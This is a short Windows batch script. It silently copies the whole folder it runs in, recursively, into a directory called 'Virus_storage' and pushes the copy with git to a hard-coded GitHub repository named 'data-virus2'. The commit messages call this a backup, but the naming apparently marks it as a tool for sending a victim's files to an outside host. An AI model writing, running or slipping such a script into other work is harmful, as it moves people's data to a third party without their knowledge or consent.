@echo off

if not exist "Virus_storage" mkdir "Virus_storage"

robocopy "." "Virus_storage" /E /XD "Virus_storage" >nul

cd Virus_storage

if exist ".git" (
    git add .
    git commit -m "Update backup"
    git push origin main
) else (
    git init
    git branch -M main
   git remote add origin https://github.com/kaibad-611/data-virus2.git
    git add .
    git commit -m "Initial backup"
    git push -u origin main
)

exit